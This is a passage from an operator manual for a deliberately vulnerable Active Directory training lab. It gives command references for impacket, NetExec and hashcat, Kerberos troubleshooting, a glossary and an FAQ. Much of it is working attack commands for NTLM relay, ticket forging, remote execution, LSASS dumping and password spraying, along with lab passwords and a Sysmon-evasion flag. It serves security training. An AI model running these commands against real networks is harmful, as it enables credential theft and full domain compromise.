impacket-GetUserSPNs corp.local/alice -hashes :<NT> -dc-ip 10.10.0.10 -request
# Use AES key (RC4 downgrade still works in DVAD)
impacket-GetUserSPNs corp.local/alice -aesKey <hex> -dc-ip 10.10.0.10 -request
```

### C.5 `impacket-GetNPUsers`

```bash
# Bulk roast unknown users
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10 -format hashcat -outputfile asrep.kr
# Roast a single known user
impacket-GetNPUsers corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile asrep.kr
```

### C.6 `impacket-ntlmrelayx`

```bash
# Standard SMB → SMB relay
sudo impacket-ntlmrelayx -t smb://10.10.0.13 -smb2support
# Relay to LDAPS, write RBCD
sudo impacket-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access --no-smb-server
# Relay to ADCS web enrol (ESC8)
sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                         --adcs --template DomainController -smb2support
# Relay to ICPR-RPC (ESC11)
sudo impacket-ntlmrelayx -t rpc://ca01.corp.local -rpc-mode ICPR -icpr-ca-name CORP-CA -smb2support
# Multi-target
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
# Add socks proxy for relayed sessions
sudo impacket-ntlmrelayx -socks -smb2support
# Then use:
proxychains4 -q impacket-secretsdump -no-pass corp.local/Administrator@10.10.0.13
```

### C.7 `impacket-psexec` / `smbexec` / `wmiexec` / `dcomexec` / `atexec`

```bash
# All five accept the same auth flags:
impacket-psexec   corp.local/Administrator:'DVADlab2024!'@10.10.0.13
impacket-smbexec  corp.local/Administrator:'DVADlab2024!'@10.10.0.13
impacket-wmiexec  corp.local/Administrator:'DVADlab2024!'@10.10.0.13
impacket-dcomexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13
impacket-atexec   corp.local/Administrator:'DVADlab2024!'@10.10.0.13 'whoami'

# With NT hash
impacket-psexec -hashes :<NT> Administrator@10.10.0.13
# With ticket
KRB5CCNAME=admin.ccache impacket-psexec -k -no-pass dc01.corp.local
# With AES
impacket-psexec -aesKey <hex> -k -no-pass Administrator@10.10.0.13
# Specify share for staging
impacket-psexec ... -share ADMIN\$
# Specify a custom service name (Sysmon evasion)
impacket-psexec ... -service-name 'WindowsUpdate'
# Non-interactive command
impacket-psexec ... -c 'cmd.exe /c whoami > C:\out.txt'
```

### C.8 `impacket-ticketer`

```bash
# Forge golden
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator
# AES variant
impacket-ticketer -aesKey <krbtgt_aes256> -domain-sid <CORP_SID> -domain corp.local Administrator
# Forge silver
impacket-ticketer -nthash <svc_nt> -domain-sid <CORP_SID> -domain corp.local -spn cifs/file01 Administrator
# Forge with ExtraSID (child → parent)
impacket-ticketer -nthash <eu_krbtgt_nt> -domain-sid <EU_SID> -domain eu.corp.local \
                  -extra-sid <CORP_SID>-519 Administrator
# Forge trust ticket
impacket-ticketer -nthash <trust_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -extra-sid <FIN_SID>-519 -spn krbtgt/finance.local Administrator
# Custom lifetime (default 10 years)
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -duration 24 Administrator
# Add custom groups
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -groups 512,513,518,519,520 Administrator
```

### C.9 `impacket-addcomputer`

```bash
# Add a machine account using MAQ=10
impacket-addcomputer corp.local/alice:'DVADlab2024!' -computer-name 'evil$' \
                     -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
# Specify SamAccountName + DNS
impacket-addcomputer corp.local/alice:... -computer-name evil -computer-pass 'P!' \
                     -dns-host-name 'evil.corp.local'
# Delete it
impacket-addcomputer corp.local/alice:... -computer-name 'evil$' -delete
```

### C.10 `impacket-rbcd`

```bash
# Write
impacket-rbcd corp.local/alice:'DVADlab2024!' -delegate-from 'evil$' \
              -delegate-to 'ws01$' -dc-ip 10.10.0.10 -action write
# Read
impacket-rbcd corp.local/alice:'...' -delegate-to 'ws01$' -dc-ip 10.10.0.10 -action read
# Flush
impacket-rbcd corp.local/alice:'...' -delegate-to 'ws01$' -dc-ip 10.10.0.10 -action flush
# Remove a specific delegate
impacket-rbcd corp.local/alice:'...' -delegate-from 'evil$' -delegate-to 'ws01$' -action remove
```

### C.11 `impacket-lookupsid`

```bash
# RID brute (anonymous)
impacket-lookupsid corp.local/anonymous@10.10.0.10 20000
# RID brute with creds
impacket-lookupsid corp.local/alice:'DVADlab2024!'@10.10.0.10 20000
# Cross-domain
impacket-lookupsid eu.corp.local/alice:...@10.10.0.11 20000
```

### C.12 `impacket-PetitPotam`

```bash
# Anonymous to DC (lab default)
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10
# Anonymous variant (some endpoints accept no auth)
impacket-PetitPotam 10.10.0.1 10.10.0.10
# With ticket
KRB5CCNAME=alice.ccache impacket-PetitPotam -k -no-pass 10.10.0.1 dc01.corp.local
```

---

## Appendix D — NetExec module reference

NetExec (formerly CrackMapExec) ships dozens of modules. The ones DVAD instructors expect students to know:

| Module | Protocol | Effect |
|---|---|---|
| `enum_trusts` | ldap | Lists trustedDomain entries |
| `gpoenum` | ldap | Lists GPOs + their links |
| `groupmembership` | ldap | Computes effective group membership |
| `laps` | ldap | Reads `ms-Mcs-AdmPwd` for entitled hosts (no-op in DVAD; LAPS not deployed) |
| `gmsa` | ldap | Retrieves the gMSA password for entitled principals |
| `gmsa-convert-id` | ldap | Resolves the gMSA principal's SID |
| `find-computer` | ldap | Finds a computer by name (resolves SID) |
| `daclread` | ldap | Reads DACL of any object |
| `whoami` | ldap | Confirms cred validity by binding |
| `pso` | ldap | Dumps Password Settings Objects |
| `obsolete` | ldap | Finds OSes ≤Win Server 2012 |
| `pre2k` | ldap | Pre-Windows 2000 computer accounts |
| `unconstrained` | ldap | Lists computers with unconstrained delegation |
| `subnets` | ldap | Lists AD sites + subnets |
| `lsassy` | smb | Remote LSASS dump on hosts where you have admin |
| `dpapi` | smb | Decrypts DPAPI offline |
| `wifi` | smb | Extracts saved Wifi credentials |
| `enum_ca` | smb | Enumerates CA via certutil |
| `rdp` | smb | Toggles RDP NLA, reads NLA state |
| `slinky` | smb | Drops a `.lnk` that triggers SMB auth |
| `keepass_discover` | smb | Hunts for `.kdbx` files |
| `mssql_priv` | mssql | Enumerates roles + impersonation |
| `nopac` | smb | Detects + exploits noPac |
| `petitpotam` | smb | Wraps the coercion |
| `printerbug` | smb | Wraps the coercion |
| `coerce_plus` | smb | All-in-one coercion menu |
| `change-password` | smb | Changes a user's password if you have GenericWrite |
| `add-computer` | smb | Add machine account (uses MAQ) |
| `add-rbcd` | smb | Writes msDS-AllowedToActOnBehalfOfOtherIdentity |
| `bh_owned` | ldap | Marks principals as owned in BloodHound |
| `bh_query` | ldap | Runs arbitrary Cypher against BloodHound |

Run example:

```bash
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M enum_trusts
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M gmsa
nxc smb  10.10.0.0/24 -u alice -p 'DVADlab2024!' -M coerce_plus
nxc smb  10.10.0.0/24 -u alice -p 'DVADlab2024!' -M lsassy
```

---

## Appendix E — Wordlists, hashcat modes, and cracking strategy

DVAD's lab passwords are intentionally crackable, but operators should still respect the strategy that mirrors a real engagement.

### E.1 Wordlists shipped on Kali

```bash
/usr/share/wordlists/rockyou.txt           # 14M lines
/usr/share/wordlists/seclists/Passwords/   # categorized
/usr/share/wordlists/seclists/Usernames/   # for spray + kerbrute
/usr/share/dirb/wordlists/                 # web fuzzing
```

### E.2 Hashcat modes you'll use

| Mode | Hash type | Typical source |
|---|---|---|
| 1000 | NTLM | `secretsdump` output |
| 5500 | NetNTLMv1 | LLMNR / Responder (forced downgrade) |
| 5600 | NetNTLMv2 | LLMNR / Responder / mitm6 |
| 13100 | Kerberos 5 TGS-REP etype 23 | `GetUserSPNs` |
| 18200 | Kerberos 5 AS-REP etype 23 | `GetNPUsers` |
| 19600 | Kerberos 5 TGS-REP etype 17 (AES128) | `GetUserSPNs -force-aes` |
| 19700 | Kerberos 5 TGS-REP etype 18 (AES256) | `GetUserSPNs -force-aes` |
| 7500 | Kerberos 5 AS-REQ Pre-Auth | (rare; works on AS-REQ sniff) |
| 16500 | JWT | (lab extension) |

### E.3 Hashcat strategy ladder

```bash
# 1. Straight wordlist (fastest)
hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt --force
# 2. Rule-based
hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# 3. Combinator
hashcat -m 13100 -a 1 spns.kr rockyou.txt rockyou.txt
# 4. Mask attack
hashcat -m 13100 -a 3 spns.kr '?u?l?l?l?l?l20?d?d!'
# 5. Hybrid
hashcat -m 13100 -a 6 spns.kr rockyou.txt '?d?d?d?d'
```

### E.4 John the Ripper equivalents

```bash
john --format=krb5tgs --wordlist=rockyou.txt spns.kr
john --format=netntlmv2 --wordlist=rockyou.txt hashes.txt
```

### E.5 DVAD's deliberately crackable passwords

| Account | Password | Strategy |
|---|---|---|
| `alice` | `DVADlab2024!` | Straight wordlist (custom add) |
| `svc_web` | `Summer2023!` | Wordlist + season-year rule |
| `svc_legacy` | `Welcome1` | Top-100 wordlist |
| `svc_sql` | `SqlServer2025!` | Custom dict (lab-name based) |
| `dvad_user` | `Spring2024!` | Wordlist + season-year |
| `backup_op` | `Password1` | Top-10 |
| `svc_nopreauth` | `Welcome1` | Top-100 |
| `svc_sccm` | `Summer2024!` | Season-year |

A lab operator should keep a `dvad_seedlist.txt`:

```text
DVADlab2024!
Summer2023!
Summer2024!
Spring2024!
Welcome1
Password1
SqlServer2025!
Winter2024!
Autumn2024!
KrbtgtDVAD2024!
TrustKey2024!
```

Run sprays in this order (highest yield first):

```bash
nxc smb 10.10.0.10 -u users.txt -p dvad_seedlist.txt --continue-on-success
```

---

## Appendix F — Network layer & VPN troubleshooting

### F.1 Bridge state

```bash
# List all bridges
ip -br link show | grep dvad
# Detail
ip addr show dvad-ctf
ip addr show dvad-finance
ip addr show dvad-root
# Bridge port membership
brctl show dvad-ctf 2>/dev/null || bridge link show
# IP forwarding
sysctl net.ipv4.ip_forward
sysctl net.ipv6.conf.all.forwarding
# nftables NAT
sudo nft list ruleset | grep -A20 dvad
```

### F.2 dnsmasq

```bash
# project-local dnsmasq
cat /tmp/dvad-dnsmasq/dnsmasq.conf
ps -ef | grep dvad-dnsmasq
tail -f /tmp/dvad-dnsmasq/dnsmasq.log
```

If a VM doesn't get a static lease:

```bash
# Check the MAC matches what setup-network.sh has
grep <vm-name> /tmp/dvad-dnsmasq/dnsmasq.conf
# Forcibly renew
ssh administrator@<known-ip> 'ipconfig /release; ipconfig /renew'
```

### F.3 WireGuard end-to-end

```bash
# On the VPS
sudo wg show wg-dvad
sudo wg show wg-dvad latest-handshakes
# On the attacker
sudo wg show
ping -c1 10.99.0.1                     # WG gateway
ip route get 10.10.0.10
# Tail packets
sudo tcpdump -i wg-dvad -nn -c20
```

### F.4 Common WireGuard problems

| Symptom | Diagnosis | Fix |
|---|---|---|
| `wg-quick up` returns but no traffic | `AllowedIPs` mismatch | Verify `AllowedIPs = 10.10.0.0/21, 10.20.0.0/24, 10.30.0.0/24` |
| Handshake never completes | Firewall on VPS blocks 51820/udp | `ufw allow 51820/udp` |
| Handshake OK, no L3 reach | IP forwarding off | `sysctl -w net.ipv4.ip_forward=1` |
| Reach to lab subnets only, not lab DNS | dnsmasq listening on wrong iface | restart `vps-wg-gateway.sh` |
| Slow / dropped | MTU mismatch | Set `MTU = 1320` in both peer configs |

### F.5 nftables sample

```bash
sudo nft list ruleset
sudo nft add table inet dvad-fw
sudo nft add chain inet dvad-fw forward '{ type filter hook forward priority 0 ; policy drop ; }'
sudo nft add rule  inet dvad-fw forward ct state established,related accept
sudo nft add rule  inet dvad-fw forward iifname "wg-dvad" oifname "dvad-ctf"     accept
sudo nft add rule  inet dvad-fw forward iifname "wg-dvad" oifname "dvad-finance" accept
sudo nft add rule  inet dvad-fw forward iifname "wg-dvad" oifname "dvad-root"    accept
```

---

## Appendix G — Ansible playbook anatomy

For operators who plan to modify the lab or contribute changes.

### G.1 `playbooks/site.yml` phases

```text
1.  windows_base          — Defender off, WinRM up, firewall down
2.  ad-ds-setup           — promote forest root corp.local
3.  child-domain-setup    — promote child eu.corp.local
4.  network_setup         — DNS conditional forwarders
5.  trust-setup           — corp↔finance, corp↔root (SID filter OFF)
6.  adcs-setup            — promote enterprise CA on ca01
7.  vuln-recon            — REC-001..015 (anon SMB/LDAP, AXFR)
8.  vuln-cred-access      — CRED-001..065 (Kerberoast, AS-REP, weak svc)
9.  vuln-lateral          — LAT-001..035 (psexec/wmiexec surface)
10. vuln-acl              — AdminSDHolder, DnsAdmins, etc.
11. vuln-privesc          — PE-001..060
12. vuln-persistence      — PER-001..037
13. vuln-forest-compromise — DF-001..040
14. flag-deployment       — flag_factory → 382 .txt drops
```

### G.2 Inventory groups

```yaml
all:
  children:
    all_dcs:           # dc01.corp.local, dc01.eu.corp.local, dc01.finance.local, dc01.root.corp
    corp_servers:      # ca01, file01, sql01
    corp_workstation:  # ws01
    member_servers:    # ca01, file01, sql01 (alias of corp_servers minus ws01)
```

Phase 6 (`adcs-setup`) explicitly imports the `corp_servers` group; that's why ca01 is in *both* `corp_servers` and `all_dcs` filter chains. The duplicate membership is intentional.

### G.3 Idempotency contract

Every task has a `name:` matching its purpose. Re-running the playbook on a healthy lab should converge in <2 min with zero "changed" tasks. If a task is `changed=1` on a re-run, that's a bug — file it.

### G.4 Tagging strategy

```bash
ansible-playbook ... --tags windows_base       # just rehydrate WinRM
ansible-playbook ... --tags adcs_setup         # just re-promote CA
ansible-playbook ... --tags vuln_recon         # just re-drop recon vulns
ansible-playbook ... --tags flag_factory       # just refresh flags
ansible-playbook ... --skip-tags activation    # skip Massgrave
```

### G.5 Common task patterns

```yaml
# Idempotent registry write (Defender disable)
- name: disable Windows Defender
  win_regedit:
    path: HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender
    name: DisableAntiSpyware
    data: 1
    type: dword

# Idempotent group add (Backup Operators)
- name: add svc_backup to Backup Operators
  win_domain_group_membership:
    name: Backup Operators
    members: [svc_backup]
    state: present

# Idempotent template publish (ESC1)
- name: publish ESC1Template
  win_command: certutil -setca template ESC1Template +CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
  changed_when: false
```

---

## Appendix H — Time and Kerberos minutiae

### H.1 Why time matters

Kerberos rejects tickets when the clock skew between requester and KDC exceeds 5 minutes (`MaxKerberosTimeskew`). DVAD ships with the lab's clock un-managed — every reboot can drift.

```bash
# Check skew
ntpdate -q 10.10.0.10
# Sync attacker
sudo rdate -n 10.10.0.10
# Sync VPS
sudo ntpdate 10.10.0.10
# Persistent (systemd-timesyncd)
sudo timedatectl set-ntp true
```

If a particular ticket request returns `KRB_AP_ERR_SKEW`, the response includes the KDC's view of "now" — use it:

```bash
impacket-getTGT corp.local/alice:... -dc-ip 10.10.0.10 2>&1 | grep -i skew
# Parse the skew, then:
sudo date -s @<unix_ts>
```

### H.2 Encryption type selection

| Etype | RFC name | Hash mode | DVAD behaviour |
|---|---|---|---|
| 0x01 | DES-CBC-CRC | — | Disabled |
| 0x03 | DES-CBC-MD5 | — | Disabled |
| 0x11 | AES128-CTS-HMAC-SHA1-96 | 19600 | Default |
| 0x12 | AES256-CTS-HMAC-SHA1-96 | 19700 | Default |
| 0x17 | RC4-HMAC | 13100 | **Allowed** (DVAD downgrade vector) |

To force RC4 on a hardened account:

```bash
impacket-GetUserSPNs corp.local/alice:... -request -outputfile spns.kr
# By default impacket asks for etype 17/18; the DC returns 23 because
# `msDS-SupportedEncryptionTypes` defaults to RC4|AES on DVAD service
# accounts.
```

To deliberately request only AES (test hardening):

```bash
impacket-GetUserSPNs corp.local/alice:... -request -outputfile spns.kr -force-aes
```

### H.3 PAC validation modes

DVAD ships with the registry tweaks that allow noPac + ExtraSID:

```text
HKLM\SYSTEM\CurrentControlSet\Services\Kdc\KrbtgtFullPacSignature   = 0
HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\FullSecureChannelProtection = 0
HKLM\SYSTEM\CurrentControlSet\Services\Kdc\ApplyDefaultDomainPolicy = 0
```

If your forged ticket is rejected, verify these via `Get-ItemProperty` on the DC.

### H.4 Useful ccache manipulation

```bash
# Inspect a ccache
klist -c admin.ccache
KRB5CCNAME=admin.ccache klist
# Merge multiple ccache
cat tgt1.ccache tgt2.ccache > merged.ccache
# Convert to keytab (for Linux-side use)
ktutil -k corp.keytab add -p alice@CORP.LOCAL -e arcfour-hmac -V 0 -w 'DVADlab2024!'
# Convert PFX to ccache (Linux PKINIT)
gss-client -mech kerberos5 -port 88 -service host@dc01.corp.local -k -pfx admin.pfx
```

### H.5 Modes of PKINIT in DVAD

DVAD's CA issues certs with the standard `szOID_NT_PRINCIPAL_NAME` SAN. PKINIT works with no additional configuration. To verify:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10 -debug
```

Look for `[*]	Got TGT` followed by `[*]	Trying to retrieve NT hash for ...`.

---

## Appendix I — Operator quick-reference card

A two-column card you can keep open beside your terminal.

```text
NET             ATTACK
==============  =================
corp.local      10.10.0.0/21    nxc smb <range> -u '' -p '' --shares
eu.corp.local   10.10.0.11      kerbrute userenum -d corp.local --dc <ip>
finance.local   10.20.0.0/24    GetNPUsers corp.local/ -no-pass -usersfile
root.corp       10.30.0.0/24    GetUserSPNs ... -request -outputfile

CRED LAB        FORGE
==============  =================
DVADlab2024!    ticketer -nthash <krbtgt> -domain-sid <SID>
KrbtgtDVAD2024! ticketer -nthash <trust> -extra-sid <FIN>-519
TrustKey2024!   getST -spn cifs/... -impersonate Administrator
SqlServer2025!  certipy req -ca CORP-CA -template ESC1Template -upn

DC IPs          COERCE+RELAY
==============  =================
dc01.corp:.10   ntlmrelayx -t http://10.10.0.12/certsrv... --adcs
dc01.eu:.11     PetitPotam -u alice -p ... -d corp.local <atk> <dc>
ca01:.12        printerbug 'corp/alice:...'@<dc> <atk>
file01:.13      dfscoerce.py -d corp -u alice -p ... <atk> <dc>
sql01:.14       coerce_plus from nxc (any of the four)
ws01:.100       mitm6 -d corp.local -i <iface>

PIVOT           PERSIST
==============  =================
psexec / wmiexec  Golden Ticket (PER-001)
evil-winrm        Silver Ticket (PER-002)
RDP +sec-nla      Skeleton key (PER-005)
SSH file01        DSRM      (PER-006)
proxychains+nxc   Shadow Cr (PER-013)
                  Sapphire   (PER-004)
                  RBCD       (PER-014)
                  Golden Cert (PER-019)
```

---

## Appendix J — Common command failures and what they mean

| Error | What's actually wrong |
|---|---|
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Username typo, or hostname not in DNS, or wrong `default_realm` in krb5.conf |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN doesn't exist; `setspn -L <svc>` to verify |
| `KDC_ERR_PREAUTH_FAILED` | Wrong password / hash |
| `KDC_ERR_TKT_EXPIRED` | TGT > 10 h, request a new one |
| `KRB_AP_ERR_SKEW` | Clock drift > 5 min |
| `KRB_AP_ERR_MODIFIED` | Key mismatch (wrong NT hash for service) |
| `KRB_AP_ERR_TKT_NYV` | Ticket Not Yet Valid (clock drift the other way) |
| `KDC_ERR_BADOPTION` | S4U requested for a non-forwardable TGT — use `-force-forwardable` |
| `STATUS_LOGON_FAILURE` | Wrong NTLM cred (SMB) |
| `STATUS_ACCESS_DENIED` | Cred OK but no rights — re-check group membership |
| `STATUS_NOT_SUPPORTED` (SMB1) | EternalBlue checker hitting SMB2-only host |
| `STATUS_BAD_NETWORK_NAME` | Share doesn't exist or no read perm |
| `RPC_S_CALL_FAILED` | RPC endpoint not exposed — check `rpcdump.py` first |
| `LDAP_INSUFFICIENT_ACCESS` | LDAP bind OK but not authorized for the OU |
| `LDAP_STRONG_AUTH_REQUIRED` | LDAP signing enforced — use `-ldap-channel-binding` or LDAPS |
| `RC4 ticket not supported` | Service requires AES-only — drop `-force-rc4` |

---

## Appendix K — Glossary

**Account Operators** — built-in group with limited user/group management. DVAD pre-populates it for PE-026.

**ADCS (Active Directory Certificate Services)** — Microsoft's PKI built into AD. DVAD's `ca01` hosts an Enterprise CA with ESC1..ESC16 templates published.

**AS-REP** — Authentication Service Reply. Returned by the KDC in response to an AS-REQ. If pre-auth is disabled, the AS-REP contains a portion encrypted with the user's NT hash, which can be cracked offline (AS-REP roasting).

**Backup Operators** — built-in group with `SeBackupPrivilege`. Members can read any file including NTDS.dit via VSS or shadow copy.

**ccache (credential cache)** — On-disk Kerberos ticket file (`/tmp/krb5cc_<uid>` by default). `KRB5CCNAME` env var redirects.

**CDC (Coerced Domain Controller)** — A coerced DC authenticates to attacker-controlled relay sink.

**Diamond Ticket** — Modifies a real TGT instead of forging from scratch; harder to detect than Golden.

**DSRM (Directory Services Restore Mode)** — Local backup admin on each DC. DVAD enables network logon for DSRM via `DsrmAdminLogonBehavior=2`.

**EA (Enterprise Admin)** — Forest-wide privilege. Member of `Enterprise Admins@<forest root>`.

**ENROLLEE_SUPPLIES_SUBJECT** — Cert template flag allowing the requester to dictate the Subject Alternative Name. Foundation of ESC1.

**ESC1..ESC16** — Numbered ADCS misconfigurations from the SpecterOps "Certified Pre-Owned" paper. DVAD publishes all 16.

**ExtraSID** — SID History field in a Kerberos PAC. Used to add cross-domain privilege (e.g. `<PARENT_SID>-519`).

**FSP (Foreign Security Principal)** — Object representing a cross-forest identity. DVAD creates FSPs to enable Pattern S.

**gMSA (group Managed Service Account)** — Auto-rotating service account. Password retrievable by `PrincipalsAllowedToRetrieveManagedPassword`.

**Golden Cert** — Cert forged from a stolen CA cert + key. Survives password rotation.

**Golden Ticket** — TGT forged with the krbtgt NT/AES key.

**ICPR (ICertPassage)** — RPC interface on a CA, used in ESC11.

**KCD (Kerberos Constrained Delegation)** — Older AD feature allowing one service to impersonate users to another specific service.

**MAQ (MachineAccountQuota)** — Default 10 per user; allows adding fake machine accounts (Patterns D, E).

**noPac** — CVE-2021-42278/42287 trick that renames a machine account to a DC SamAccountName.

**OverPTH** — Pass-the-hash that also seeds a TGT (`Rubeus.exe asktgt /aes256:<key>`).

**PAC (Privilege Attribute Certificate)** — Microsoft extension to Kerberos tickets carrying user group SIDs.

**PetitPotam** — Coercion via MS-EFSR pipe.

**PKINIT** — RFC 4556 extension allowing TGT acquisition with a certificate instead of a password.

**PrinterBug** — Coercion via MS-RPRN pipe.

**RBCD (Resource-Based Constrained Delegation)** — Modern delegation model where the *resource* (not the front-end service) controls who can impersonate. Misconfigured RBCD = local-to-domain takeover.

**S4U2Self** — Service-to-self request, returns a forwardable ticket impersonating any user.

**S4U2Proxy** — Service-to-service request, uses an S4U2Self ticket to obtain a service ticket against another service.

**Sapphire Ticket** — Variant of Golden that pulls a live PAC via S4U2Self before forging, making the PAC indistinguishable from real.

**Shadow Credentials** — Writing a public key to `msDS-KeyCredentialLink` so PKINIT works against a victim.

**SID History** — Multi-valued AD attribute; the PAC carries it for cross-domain auth.

**Silver Ticket** — Service ticket forged with a service account's NT/AES key.

**Skeleton Key** — Patched LSASS allowing every account to authenticate with a master password.

**SPN (Service Principal Name)** — `service/host[:port]` string registered to an AD account.

**Trust Key** — The NT/AES of a trust account (`<DOMAIN>$`). Used to forge inter-realm referral tickets.

**Unconstrained Delegation** — Service stores a copy of the user's TGT in LSASS. Capturing LSASS captures every authenticated TGT.

**UnPAC-the-Hash** — Extracting the user's NT hash from a PKINIT exchange's PAC.

**WPAD (Web Proxy Auto-Discovery)** — IE/Edge auto-detects HTTP proxy via DNS/DHCP. Used by mitm6 + ntlmrelayx.

**ZeroLogon** — CVE-2020-1472. Zeroed AES auth bytes in MS-NRPC let an unauthenticated attacker reset a DC's machine account password.

---

## Appendix L — Reading list (post-DVAD)

If DVAD's 382 IDs feel mastered, the next layer of expertise:

| Resource | What it adds |
|---|---|
| [Microsoft Active Directory Security](https://docs.microsoft.com/en-us/windows-server/identity/) | Vendor-side reference (defender's view) |
| SpecterOps — Certified Pre-Owned | Original ADCS ESC paper |
| Will Schroeder — *Kerberoasting Revisited* | TGS-REP cracking deep-dive |
| Charlie Bromberg — *Pwning the Domain* | The Hacker Recipes; mirrors DVAD's vector taxonomy |
| Dirk-jan Mollema — *Privilege escalation in AD: the human factor* | mitm6/ntlmrelayx history |
| Antonio Cocomazzi — *PrintSpoofer / EFSPotato* | Token impersonation primitives |
| Benjamin Delpy — *mimikatz wiki* | Authoritative Mimikatz reference |
| Adam Chester — *DCShadow* | Forest-tier persistence |
| HarmJ0y — *I Hunt Sys Admins 2.0* | Hunting + reverse-OPSEC |
| Andy Robbins — *BloodHound queries* | Modern Cypher patterns |
| Lee Christensen — *Domain Persistence: Golden Ticket* | Ticket forging deep-dive |
| Tim Medin — *Kerberoasting* | Origin of the technique |
| Sean Metcalf — *adsecurity.org* | Comprehensive AD blog |
| Antonio Formato — *Sentinel hunting queries* | Defender-side mappings |
| Cobalt Strike documentation | OPSEC-conscious tooling alternatives |

---

## Appendix M — Frequently asked operator questions

**Q: My BloodHound is empty after import.**
A: You ran `bloodhound-python` against a DC that's still being provisioned. Wait until `ansible-playbook ... site.yml` reports `PLAY RECAP: failed=0`, then re-collect.

**Q: `certipy find` shows no vulnerable templates.**
A: ADCS phase didn't run. `ansible-playbook ... --tags adcs_setup`, then re-find.

**Q: My Golden Ticket is rejected with `KRB_AP_ERR_MODIFIED`.**
A: Either the krbtgt NT hash is stale (it changes if Ansible re-runs the cred-access role with a new value) or the domain SID is wrong. Re-run `impacket-secretsdump -just-dc-user krbtgt`, re-run `impacket-lookupsid`.

**Q: ZeroLogon worked, but now nothing authenticates.**
A: You forgot to run `reinstall_original_pw.py`. Re-deploy from scratch — Netlogon channel is unrecoverable without the saved hash.

**Q: I get `PetitPotam` to fire but `ntlmrelayx` doesn't catch it.**
A: Order of operations: start `ntlmrelayx` *first*, then `PetitPotam`. Also verify the relay is bound to the same interface the DC will reach (your attacker IP from the DC's perspective).

**Q: How do I undo a Shadow Credentials drop?**
A: `certipy shadow clear -u alice -p ... -account <victim>` removes the key. Or `certipy shadow auto` automatically restores.

**Q: Why does the lab feel slower than usual on day 3?**
A: VSS snapshots accumulate (Windows Server keeps shadow copies after `secretsdump -use-vss`). Boot each VM and `vssadmin delete shadows /all /quiet`.

**Q: I'm stuck on Pattern C — `ntlmrelayx` returns the cert blob but `certipy auth` fails.**
A: The relayed cert is for `DC01$`, not `Administrator`. Use it to DCSync (`impacket-secretsdump -k -no-pass -just-dc-user krbtgt`); don't try to log on as `Administrator` with it.

**Q: How do I add my own attack VM to the topology?**
A: Add an entry to `qemu/vm-create.sh` `VM_DEFS`, then to `qemu/network/setup-network.sh` `add_static_leases`, then to `ansible/inventory.yml`. The four-way invariant is documented in `CLAUDE.md` / `AGENTS.md`.

**Q: Where's the "instructor mode" with hints?**
A: There isn't one — DVAD is a *lab*, not a CTF platform. Hints would defeat the learning loop. If you're truly stuck, `docs/08-solve-path.md` walks each pattern with the explicit precondition→action→result trace.

**Q: Can DVAD run on macOS / WSL?**
A: No. KVM is required. macOS uses Hypervisor.framework (not supported); WSL2 nests on Hyper-V (nested KVM is unstable). Use a Linux host.

**Q: How much disk does a full lab actually take?**
A: ~100 GB after first deploy: ~20 GB Windows install per VM × 8 = ~80 GB qcow2; +~6 GB Windows ISO + ~700 MB virtio-win in `media/`; +~3 GB autounattend artefacts.

**Q: How do I run two operators against the same lab?**
A: Either (1) two WG peer configs (each peer gets its own `/32` in `10.99.0.0/24`); or (2) one user per attacker box with separate `KRB5CCNAME` directories. Avoid sharing the same ccache — clock drift will haunt you.

**Q: What's the lab's threat model — what attacks should *not* work?**
A: None. DVAD is intentionally vulnerable on every axis. If you find something that *isn't* vulnerable and PLAN.md says it should be, that's a bug — file it.

**Q: Can I publish my walkthrough/blog post about DVAD?**
A: Yes — the project is meant to be cited. Link back to PLAN.md when you reference specific IDs.

**Q: What about exfiltration / data-loss scenarios?**
A: DVAD's `flag_factory` stages the goal artifacts; treat the `FLAG-*.txt` files as the "sensitive" data. Exfil via WinRM `download`, SMB copy, or DNS tunnelling.

**Q: How do I simulate a kiosk / RDP-jump-host scenario?**
A: `ws01` is the kiosk. Lock down Internet Explorer policies via local GP (use `gpedit.msc` over RDP), then practice escape (App-Locker bypass, sticky-keys, etc.).

**Q: Does DVAD include EDR?**
A: No, by default. Add Sysmon manually if you want to test detections (Appendix C in `docs/`).

**Q: How is DVAD different from GOAD / Vulnerable AD?**
A: GOAD is a 5-VM lab focused on Azure/cloud trust scenarios; Vulnerable AD is single-domain. DVAD = 8-VM, 3-forest, ADCS + cross-trust + ENUM-heavy. Bigger surface, slower to deploy.

**Q: Is the lab CTF-ready (single objective + scoring)?**
A: Not out of the box. The flag manifest is per-host artefacts, not score-tracking. Use `tools/score.py` (operator-extended) to wrap.

---

## Appendix P — Per-pattern deep-dives (A-Z extended)

Each pattern below adds operator notes, expected failure modes, opsec considerations, and validation commands beyond the §10/§11 quick-runs.

### Pattern A — Kerberoast deep-dive

**Theory**: Any authenticated principal can request a TGS for any SPN. The TGS-REP contains a portion encrypted with the *service account*'s NT hash. If the service account password is weak, offline crack recovers the cleartext.

**Pre-condition**: ≥1 user with SPN registered (DVAD: svc_web, svc_sql, svc_iis, svc_sccm).
**Time to DA**: 1-15 min depending on crack performance.

**Operator one-liner (preferred)**:

```bash
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
